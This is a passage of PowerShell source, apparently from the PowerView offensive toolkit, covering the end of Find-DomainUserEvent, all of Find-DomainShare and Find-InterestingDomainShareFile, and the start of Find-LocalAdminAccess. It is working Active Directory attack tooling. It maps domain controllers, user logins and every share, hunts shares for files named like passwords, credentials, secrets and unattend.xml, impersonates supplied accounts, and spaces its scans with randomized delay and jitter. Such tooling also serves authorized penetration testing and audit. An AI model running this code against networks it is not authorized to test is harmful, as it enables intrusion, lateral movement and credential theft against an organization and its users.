$PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {\n            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname\n        }\n        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {\n            # otherwise we're querying a specific group\n            $GroupSearcherArguments = @{\n                'Identity' = $UserGroupIdentity\n                'Recurse' = $True\n            }\n            Write-Verbose \"UserGroupIdentity: $UserGroupIdentity\"\n            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }\n            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }\n            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }\n            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }\n            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }\n            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }\n            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }\n            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName\n        }\n\n        # build the set of computers to enumerate\n        if ($PSBoundParameters['ComputerName']) {\n            $TargetComputers = $ComputerName\n        }\n        else {\n            # if not -ComputerName is passed, query the current (or target) domain for domain controllers\n            $DCSearcherArguments = @{\n                'LDAP' = $True\n            }\n            if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }\n            if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }\n            if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }\n            Write-Verbose \"[Find-DomainUserEvent] Querying for domain controllers in domain: $Domain\"\n            $TargetComputers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname\n        }\n        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {\n            $TargetComputers = @(,$TargetComputers)\n        }\n        Write-Verbose \"[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length)\"\n        Write-Verbose \"[Find-DomainUserEvent] TargetComputers $TargetComputers\"\n        if ($TargetComputers.Length -eq 0) {\n            throw '[Find-DomainUserEvent] No hosts found to enumerate'\n        }\n\n        # the host enumeration block we're using to enumerate all servers\n        $HostEnumBlock = {\n            Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)\n\n            ForEach ($TargetComputer in $ComputerName) {\n                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer\n                if ($Up) {\n                    $DomainUserEventArgs = @{\n                        'ComputerName' = $TargetComputer\n                    }\n                    if ($StartTime) { $DomainUserEventArgs['StartTime'] = $StartTime }\n                    if ($EndTime) { $DomainUserEventArgs['EndTime'] = $EndTime }\n                    if ($MaxEvents) { $DomainUserEventArgs['MaxEvents'] = $MaxEvents }\n                    if ($Credential) { $DomainUserEventArgs['Credential'] = $Credential }\n                    if ($Filter -or $TargetUsers) {\n                        if ($TargetUsers) {\n                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}\n                        }\n                        else {\n                            $Operator = 'or'\n                            $Filter.Keys | ForEach-Object {\n                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {\n                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq 'and')) {\n                                        $Operator = 'and'\n                                    }\n                                }\n                            }\n                            $Keys = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}\n                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {\n                                if ($Operator -eq 'or') {\n                                    ForEach ($Key in $Keys) {\n                                        if ($_.\"$Key\" -match $Filter[$Key]) {\n                                            $_\n                                        }\n                                    }\n                                }\n                                else {\n                                    # and all clauses\n                                    ForEach ($Key in $Keys) {\n                                        if ($_.\"$Key\" -notmatch $Filter[$Key]) {\n                                            break\n                                        }\n                                        $_\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    else {\n                        Get-DomainUserEvent @DomainUserEventArgs\n                    }\n                }\n            }\n        }\n    }\n\n    PROCESS {\n        # only ignore threading if -Delay is passed\n        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n\n            Write-Verbose \"[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count)\"\n            Write-Verbose \"[Find-DomainUserEvent] Delay: $Delay, Jitter: $Jitter\"\n            $Counter = 0\n            $RandNo = New-Object System.Random\n\n            ForEach ($TargetComputer in $TargetComputers) {\n                $Counter = $Counter + 1\n\n                # sleep for our semi-randomized interval\n                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)\n\n                Write-Verbose \"[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))\"\n                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential\n                $Result\n\n                if ($Result -and $StopOnSuccess) {\n                    Write-Verbose \"[Find-DomainUserEvent] Target user found, returning early\"\n                    return\n                }\n            }\n        }\n        else {\n            Write-Verbose \"[Find-DomainUserEvent] Using threading with threads: $Threads\"\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction\n            $ScriptParams = @{\n                'StartTime' = $StartTime\n                'EndTime' = $EndTime\n                'MaxEvents' = $MaxEvents\n                'TargetUsers' = $TargetUsers\n                'Filter' = $Filter\n                'Credential' = $Credential\n            }\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params\n            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads\n        }\n    }\n}\n\n\nfunction Find-DomainShare {\n<#\n.SYNOPSIS\n\nSearches for computer shares on the domain. If -CheckShareAccess is passed,\nthen only shares the current user has read access to are returned.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, New-ThreadedFunction  \n\n.DESCRIPTION\n\nThis function enumerates all machines on the current (or specified) domain\nusing Get-DomainComputer, and enumerates the available shares for each\nmachine with Get-NetShare. If -CheckShareAccess is passed, then\n[IO.Directory]::GetFiles() is used to check if the current user has read\naccess to the given share. If -Credential is passed, then\nInvoke-UserImpersonation is used to impersonate the specified user before\nenumeration, reverting after with Invoke-RevertToSelf.\n\n.PARAMETER ComputerName\n\nSpecifies an array of one or more hosts to enumerate, passable on the pipeline.\nIf -ComputerName is not passed, the default behavior is to enumerate all machines\nin the domain returned by Get-DomainComputer.\n\n.PARAMETER ComputerDomain\n\nSpecifies the domain to query for computers, defaults to the current domain.\n\n.PARAMETER ComputerLDAPFilter\n\nSpecifies an LDAP query string that is used to search for computer objects.\n\n.PARAMETER ComputerSearchBase\n\nSpecifies the LDAP source to search through for computers,\ne.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries.\n\n.PARAMETER ComputerOperatingSystem\n\nSearch computers with a specific operating system, wildcards accepted.\n\n.PARAMETER ComputerServicePack\n\nSearch computers with a specific service pack, wildcards accepted.\n\n.PARAMETER ComputerSiteName\n\nSearch computers in the specific AD Site name, wildcards accepted.\n\n.PARAMETER CheckShareAccess\n\nSwitch. Only display found shares that the local user has access to.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain and target systems.\n\n.PARAMETER Delay\n\nSpecifies the delay (in seconds) between enumerating hosts, defaults to 0.\n\n.PARAMETER Jitter\n\nSpecifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3\n\n.PARAMETER Threads\n\nThe number of threads to use for user searching, defaults to 20.\n\n.EXAMPLE\n\nFind-DomainShare\n\nFind all domain shares in the current domain.\n\n.EXAMPLE\n\nFind-DomainShare -CheckShareAccess\n\nFind all domain shares in the current domain that the current user has\nread access to.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nFind-DomainShare -Domain testlab.local -Credential $Cred\n\nSearches for domain shares in the testlab.local domain using the specified alternate credentials.\n\n.OUTPUTS\n\nPowerView.ShareInfo\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.ShareInfo')]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DNSHostName')]\n        [String[]]\n        $ComputerName,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Domain')]\n        [String]\n        $ComputerDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerLDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerSearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('OperatingSystem')]\n        [String]\n        $ComputerOperatingSystem,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ServicePack')]\n        [String]\n        $ComputerServicePack,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('SiteName')]\n        [String]\n        $ComputerSiteName,\n\n        [Alias('CheckAccess')]\n        [Switch]\n        $CheckShareAccess,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $Delay = 0,\n\n        [ValidateRange(0.0, 1.0)]\n        [Double]\n        $Jitter = .3,\n\n        [Int]\n        [ValidateRange(1, 100)]\n        $Threads = 20\n    )\n\n    BEGIN {\n\n        $ComputerSearcherArguments = @{\n            'Properties' = 'dnshostname'\n        }\n        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }\n        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }\n        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }\n        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }\n        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }\n        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }\n        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }\n        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }\n\n        if ($PSBoundParameters['ComputerName']) {\n            $TargetComputers = $ComputerName\n        }\n        else {\n            Write-Verbose '[Find-DomainShare] Querying computers in the domain'\n            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname\n        }\n        Write-Verbose \"[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)\"\n        if ($TargetComputers.Length -eq 0) {\n            throw '[Find-DomainShare] No hosts found to enumerate'\n        }\n\n        # the host enumeration block we're using to enumerate all servers\n        $HostEnumBlock = {\n            Param($ComputerName, $CheckShareAccess, $TokenHandle)\n\n            if ($TokenHandle) {\n                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation\n                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet\n            }\n\n            ForEach ($TargetComputer in $ComputerName) {\n                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer\n                if ($Up) {\n                    # get the shares for this host and check what we find\n                    $Shares = Get-NetShare -ComputerName $TargetComputer\n                    ForEach ($Share in $Shares) {\n                        $ShareName = $Share.Name\n                        # $Remark = $Share.Remark\n                        $Path = '\\\\'+$TargetComputer+'\\'+$ShareName\n\n                        if (($ShareName) -and ($ShareName.trim() -ne '')) {\n                            # see if we want to check access to this share\n                            if ($CheckShareAccess) {\n                                # check if the user has access to this path\n                                try {\n                                    $Null = [IO.Directory]::GetFiles($Path)\n                                    $Share\n                                }\n                                catch {\n                                    Write-Verbose \"Error accessing share path $Path : $_\"\n                                }\n                            }\n                            else {\n                                $Share\n                            }\n                        }\n                    }\n                }\n            }\n\n            if ($TokenHandle) {\n                Invoke-RevertToSelf\n            }\n        }\n\n        $LogonToken = $Null\n        if ($PSBoundParameters['Credential']) {\n            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential\n            }\n            else {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet\n            }\n        }\n    }\n\n    PROCESS {\n        # only ignore threading if -Delay is passed\n        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n\n            Write-Verbose \"[Find-DomainShare] Total number of hosts: $($TargetComputers.count)\"\n            Write-Verbose \"[Find-DomainShare] Delay: $Delay, Jitter: $Jitter\"\n            $Counter = 0\n            $RandNo = New-Object System.Random\n\n            ForEach ($TargetComputer in $TargetComputers) {\n                $Counter = $Counter + 1\n\n                # sleep for our semi-randomized interval\n                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)\n\n                Write-Verbose \"[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))\"\n                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken\n            }\n        }\n        else {\n            Write-Verbose \"[Find-DomainShare] Using threading with threads: $Threads\"\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction\n            $ScriptParams = @{\n                'CheckShareAccess' = $CheckShareAccess\n                'TokenHandle' = $LogonToken\n            }\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params\n            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Find-InterestingDomainShareFile {\n<#\n.SYNOPSIS\n\nSearches for files matching specific criteria on readable shares\nin the domain.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, Find-InterestingFile, New-ThreadedFunction  \n\n.DESCRIPTION\n\nThis function enumerates all machines on the current (or specified) domain\nusing Get-DomainComputer, and enumerates the available shares for each\nmachine with Get-NetShare. It will then use Find-InterestingFile on each\nreadhable share, searching for files marching specific criteria. If -Credential\nis passed, then Invoke-UserImpersonation is used to impersonate the specified\nuser before enumeration, reverting after with Invoke-RevertToSelf.\n\n.PARAMETER ComputerName\n\nSpecifies an array of one or more hosts to enumerate, passable on the pipeline.\nIf -ComputerName is not passed, the default behavior is to enumerate all machines\nin the domain returned by Get-DomainComputer.\n\n.PARAMETER ComputerDomain\n\nSpecifies the domain to query for computers, defaults to the current domain.\n\n.PARAMETER ComputerLDAPFilter\n\nSpecifies an LDAP query string that is used to search for computer objects.\n\n.PARAMETER ComputerSearchBase\n\nSpecifies the LDAP source to search through for computers,\ne.g. \"LDAP://OU=secret,DC=testlab,DC=local\". Useful for OU queries.\n\n.PARAMETER ComputerOperatingSystem\n\nSearch computers with a specific operating system, wildcards accepted.\n\n.PARAMETER ComputerServicePack\n\nSearch computers with a specific service pack, wildcards accepted.\n\n.PARAMETER ComputerSiteName\n\nSearch computers in the specific AD Site name, wildcards accepted.\n\n.PARAMETER Include\n\nOnly return files/folders that match the specified array of strings,\ni.e. @(*.doc*, *.xls*, *.ppt*)\n\n.PARAMETER SharePath\n\nSpecifies one or more specific share paths to search, in the form \\\\COMPUTER\\Share\n\n.PARAMETER ExcludedShares\n\nSpecifies share paths to exclude, default of C$, Admin$, Print$, IPC$.\n\n.PARAMETER LastAccessTime\n\nOnly return files with a LastAccessTime greater than this date value.\n\n.PARAMETER LastWriteTime\n\nOnly return files with a LastWriteTime greater than this date value.\n\n.PARAMETER CreationTime\n\nOnly return files with a CreationTime greater than this date value.\n\n.PARAMETER OfficeDocs\n\nSwitch. Search for office documents (*.doc*, *.xls*, *.ppt*)\n\n.PARAMETER FreshEXEs\n\nSwitch. Find .EXEs accessed within the last 7 days.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain and target systems.\n\n.PARAMETER Delay\n\nSpecifies the delay (in seconds) between enumerating hosts, defaults to 0.\n\n.PARAMETER Jitter\n\nSpecifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3\n\n.PARAMETER Threads\n\nThe number of threads to use for user searching, defaults to 20.\n\n.EXAMPLE\n\nFind-InterestingDomainShareFile\n\nFinds 'interesting' files on the current domain.\n\n.EXAMPLE\n\nFind-InterestingDomainShareFile -ComputerName @('windows1.testlab.local','windows2.testlab.local')\n\nFinds 'interesting' files on readable shares on the specified systems.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('DEV\\dfm.a', $SecPassword)\nFind-DomainShare -Domain testlab.local -Credential $Cred\n\nSearches interesting files in the testlab.local domain using the specified alternate credentials.\n\n.OUTPUTS\n\nPowerView.FoundFile\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.FoundFile')]\n    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DNSHostName')]\n        [String[]]\n        $ComputerName,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerDomain,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerLDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $ComputerSearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('OperatingSystem')]\n        [String]\n        $ComputerOperatingSystem,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ServicePack')]\n        [String]\n        $ComputerServicePack,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('SiteName')]\n        [String]\n        $ComputerSiteName,\n\n        [Parameter(ParameterSetName = 'FileSpecification')]\n        [ValidateNotNullOrEmpty()]\n        [Alias('SearchTerms', 'Terms')]\n        [String[]]\n        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),\n\n        [ValidateNotNullOrEmpty()]\n        [ValidatePattern('\\\\\\\\')]\n        [Alias('Share')]\n        [String[]]\n        $SharePath,\n\n        [String[]]\n        $ExcludedShares = @('C$', 'Admin$', 'Print$', 'IPC$'),\n\n        [Parameter(ParameterSetName = 'FileSpecification')]\n        [ValidateNotNullOrEmpty()]\n        [DateTime]\n        $LastAccessTime,\n\n        [Parameter(ParameterSetName = 'FileSpecification')]\n        [ValidateNotNullOrEmpty()]\n        [DateTime]\n        $LastWriteTime,\n\n        [Parameter(ParameterSetName = 'FileSpecification')]\n        [ValidateNotNullOrEmpty()]\n        [DateTime]\n        $CreationTime,\n\n        [Parameter(ParameterSetName = 'OfficeDocs')]\n        [Switch]\n        $OfficeDocs,\n\n        [Parameter(ParameterSetName = 'FreshEXEs')]\n        [Switch]\n        $FreshEXEs,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $Delay = 0,\n\n        [ValidateRange(0.0, 1.0)]\n        [Double]\n        $Jitter = .3,\n\n        [Int]\n        [ValidateRange(1, 100)]\n        $Threads = 20\n    )\n\n    BEGIN {\n        $ComputerSearcherArguments = @{\n            'Properties' = 'dnshostname'\n        }\n        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }\n        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }\n        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }\n        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }\n        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }\n        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }\n        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }\n\n        if ($PSBoundParameters['ComputerName']) {\n            $TargetComputers = $ComputerName\n        }\n        else {\n            Write-Verbose '[Find-InterestingDomainShareFile] Querying computers in the domain'\n            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname\n        }\n        Write-Verbose \"[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length)\"\n        if ($TargetComputers.Length -eq 0) {\n            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'\n        }\n\n        # the host enumeration block we're using to enumerate all servers\n        $HostEnumBlock = {\n            Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)\n\n            if ($TokenHandle) {\n                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation\n                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet\n            }\n\n            ForEach ($TargetComputer in $ComputerName) {\n\n                $SearchShares = @()\n                if ($TargetComputer.StartsWith('\\\\')) {\n                    # if a share is passed as the server\n                    $SearchShares += $TargetComputer\n                }\n                else {\n                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer\n                    if ($Up) {\n                        # get the shares for this host and display what we find\n                        $Shares = Get-NetShare -ComputerName $TargetComputer\n                        ForEach ($Share in $Shares) {\n                            $ShareName = $Share.Name\n                            $Path = '\\\\'+$TargetComputer+'\\'+$ShareName\n                            # make sure we get a real share name back\n                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {\n                                # skip this share if it's in the exclude list\n                                if ($ExcludedShares -NotContains $ShareName) {\n                                    # check if the user has access to this path\n                                    try {\n                                        $Null = [IO.Directory]::GetFiles($Path)\n                                        $SearchShares += $Path\n                                    }\n                                    catch {\n                                        Write-Verbose \"[!] No access to $Path\"\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n\n                ForEach ($Share in $SearchShares) {\n                    Write-Verbose \"Searching share: $Share\"\n                    $SearchArgs = @{\n                        'Path' = $Share\n                        'Include' = $Include\n                    }\n                    if ($OfficeDocs) {\n                        $SearchArgs['OfficeDocs'] = $OfficeDocs\n                    }\n                    if ($FreshEXEs) {\n                        $SearchArgs['FreshEXEs'] = $FreshEXEs\n                    }\n                    if ($LastAccessTime) {\n                        $SearchArgs['LastAccessTime'] = $LastAccessTime\n                    }\n                    if ($LastWriteTime) {\n                        $SearchArgs['LastWriteTime'] = $LastWriteTime\n                    }\n                    if ($CreationTime) {\n                        $SearchArgs['CreationTime'] = $CreationTime\n                    }\n                    if ($CheckWriteAccess) {\n                        $SearchArgs['CheckWriteAccess'] = $CheckWriteAccess\n                    }\n                    Find-InterestingFile @SearchArgs\n                }\n            }\n\n            if ($TokenHandle) {\n                Invoke-RevertToSelf\n            }\n        }\n\n        $LogonToken = $Null\n        if ($PSBoundParameters['Credential']) {\n            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential\n            }\n            else {\n                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet\n            }\n        }\n    }\n\n    PROCESS {\n        # only ignore threading if -Delay is passed\n        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {\n\n            Write-Verbose \"[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count)\"\n            Write-Verbose \"[Find-InterestingDomainShareFile] Delay: $Delay, Jitter: $Jitter\"\n            $Counter = 0\n            $RandNo = New-Object System.Random\n\n            ForEach ($TargetComputer in $TargetComputers) {\n                $Counter = $Counter + 1\n\n                # sleep for our semi-randomized interval\n                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)\n\n                Write-Verbose \"[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))\"\n                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken\n            }\n        }\n        else {\n            Write-Verbose \"[Find-InterestingDomainShareFile] Using threading with threads: $Threads\"\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction\n            $ScriptParams = @{\n                'Include' = $Include\n                'ExcludedShares' = $ExcludedShares\n                'OfficeDocs' = $OfficeDocs\n                'ExcludeHidden' = $ExcludeHidden\n                'FreshEXEs' = $FreshEXEs\n                'CheckWriteAccess' = $CheckWriteAccess\n                'TokenHandle' = $LogonToken\n            }\n\n            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params\n            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Find-LocalAdminAccess {\n<#\n.SYNOPSIS\n\nFinds machines on the local domain where the current user has local administrator access.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Test-AdminAccess, New-ThreadedFunction  \n\n.DESCRIPTION\n\nThis function enumerates all machines on the current (or specified) domain\nusing Get-DomainComputer, and for each computer it checks if the current user\nhas local administrator access using Test-AdminAccess. If -Credential is passed,\nthen Invoke-UserImpersonation is used to impersonate the specified user\nbefore enumeration, reverting after with Invoke-RevertToSelf.\n\nIdea adapted from the local_admin_search_enum post module in Metasploit written by:\n    'Brandon McCann \"zeknox\" <bmccann[at]accuvant.com>'\n    'Thomas McCarthy 